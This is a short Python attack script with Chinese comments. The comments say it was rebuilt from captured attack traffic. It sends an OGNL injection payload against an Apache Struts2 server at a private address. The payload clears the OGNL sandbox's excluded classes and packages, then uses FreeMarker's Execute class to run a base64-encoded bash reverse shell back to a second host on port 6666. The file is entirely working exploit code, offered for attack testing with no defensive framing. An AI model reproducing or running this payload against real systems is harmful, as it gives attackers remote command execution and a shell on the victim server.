import requests
import urllib.parse
import base64
#这个攻击脚本是根据之前抓取的流量数据包中的攻击流量改写的，为了方便攻击测试

#目标服务器地址
target_url = "http://192.168.131.10:8080/"

#反弹shell命令
custom_command = "bash -i >& /dev/tcp/192.168.131.6/6666 0>&1"

base64_payload = base64.b64encode(custom_command.encode()).decode()

#构造OGNL代码
ognl_payload = f'''
%25%7B(#instancemanager=#application%5B%22org.apache.tomcat.InstanceManager%22%5D).
(#stack=#attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).
(#bean=#instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).
(#bean.setBean(#stack)).
(#context=#bean.get(%22context%22)).
(#bean.setBean(#context)).
(#macc=#bean.get(%22memberAccess%22)).
(#bean.setBean(#macc)).
(#emptyset=#instancemanager.newInstance(%22java.util.HashSet%22)).
(#bean.put(%22excludedClasses%22,#emptyset)).
(#bean.put(%22excludedPackageNames%22,#emptyset)).
(#execute=#instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).
(#execute.exec(%7B%22bash%20-c%20%7Becho,{base64_payload}%7D%7C%7Bbase64,-d%7D%7Cbash%22%7D))
%7D
'''

#进行URL解码
decoded_payload = urllib.parse.unquote(ognl_payload)
print("\nURL 解码后的 OGNL 代码:\n", decoded_payload)

#HTTP 头部
headers = {
    "Host": "{{target_url}}",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

#发送POST请求
response = requests.post(target_url, data={"id": decoded_payload}, headers=headers)

#服务器响应
print("\n服务器响应:\n", response.text)
